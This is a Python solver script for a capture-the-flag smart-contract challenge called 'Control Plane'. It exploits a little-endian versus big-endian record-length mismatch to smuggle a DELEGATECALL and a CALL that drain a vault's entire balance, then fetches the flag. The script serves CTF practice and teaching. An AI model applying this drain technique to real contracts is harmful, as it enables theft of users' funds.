#!/usr/bin/env python3
"""
Control Plane (z0d1akCTF 2026 Qualifiers) -- end-to-end solver.

Usage:
    python3 solve.py https://control-plane-<id>.chals.z0d1ak.org

Requires web3.py (tested with web3==6.x):
    pip install "web3<7" "setuptools<81"

The challenge front-end exposes:
    GET /info   -> { rpc, playerPrivateKey, playerAddress, setupAddress, chainId }
    POST <rpc>  -> a restricted JSON-RPC (eth_call / eth_sendRawTransaction / ...)
    GET /flag   -> the flag once Setup.isSolved() == true

Strategy (see build_program.py for the wire-format details):
  1. Read kernel / vault / telemetry / player from the Setup contract.
  2. Compute the settlement ticket with the vault's public quote().
  3. Build one program that hides two 0x2d records behind a 0x12 skip record,
     exploiting the validator(LE) vs executor(BE) record-length differential:
        A) mode-1 DELEGATECALL telemetry.rotate(seal)  -> arms kernel slot2
        B) mode-2 CALL vault.settle(player, balance, ticket) -> drains
  4. Send execute(program) from the player key and read /flag.
"""

import sys
import json
import urllib.request

from web3 import Web3
from build_program import build_program


def http_json(url, timeout=25):
    return json.load(urllib.request.urlopen(url, timeout=timeout))


def main(base):
    base = base.rstrip("/")
    info = http_json(base + "/info")
    w3 = Web3(Web3.HTTPProvider(base + info["rpc"]))
    acct = w3.eth.account.from_key(info["playerPrivateKey"])
    setup = Web3.to_checksum_address(info["setupAddress"])

    def getter(to, sig):
        return w3.eth.call({"to": to, "data": "0x" + Web3.keccak(text=sig)[:4].hex()})

    kernel = Web3.to_checksum_address("0x" + getter(setup, "kernel()").hex()[-40:])
    vault = Web3.to_checksum_address("0x" + getter(setup, "vault()").hex()[-40:])
    player = Web3.to_checksum_address("0x" + getter(setup, "player()").hex()[-40:])
    telemetry = Web3.to_checksum_address("0x" + getter(setup, "telemetry()").hex()[-40:])
    amount = w3.eth.get_balance(vault)
    print(f"kernel={kernel} vault={vault} telemetry={telemetry}")
    print(f"player={player} vault_balance={amount}")

    # ticket = vault.quote(player, amount)  (public view; anyone can compute it)
    quote_data = (
        "0x" + Web3.keccak(text="quote(address,uint256)")[:4].hex()
        + "0" * 24 + player[2:].lower() + amount.to_bytes(32, "big").hex()
    )
    ticket = w3.eth.call({"to": vault, "data": quote_data})[:16]
    print(f"ticket={ticket.hex()}")

    program = build_program(kernel, vault, telemetry, player, amount, ticket, w3.eth.chain_id)
    print(f"program={program.hex()}")

    exec_sel = Web3.keccak(text="execute(bytes)")[:4].hex()
    tx_data = (
        "0x" + exec_sel
        + (32).to_bytes(32, "big").hex()
        + len(program).to_bytes(32, "big").hex()
        + program.hex() + "00" * ((-len(program)) % 32)
    )

    # dry-run: reverts here if anything is wrong, before we spend gas
    w3.eth.call({"to": kernel, "data": tx_data, "from": acct.address})

    tx = {
        "to": kernel, "from": acct.address, "data": tx_data,
        "gas": 2_000_000, "gasPrice": w3.eth.gas_price,
        "nonce": w3.eth.get_transaction_count(acct.address),
        "chainId": w3.eth.chain_id,
    }
    signed = acct.sign_transaction(tx)
    raw = getattr(signed, "raw_transaction", None) or getattr(signed, "rawTransaction")
    h = w3.eth.send_raw_transaction(raw)
    receipt = w3.eth.wait_for_transaction_receipt(h)
    print(f"exploit tx {h.hex()} status={receipt.status} gas={receipt.gasUsed}")

    solved = int(getter(setup, "isSolved()").hex(), 16) == 1
    print(f"isSolved={solved}")
    print("FLAG:", http_json(base + "/flag"))


if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit("usage: python3 solve.py https://control-plane-<id>.chals.z0d1ak.org")
    main(sys.argv[1])
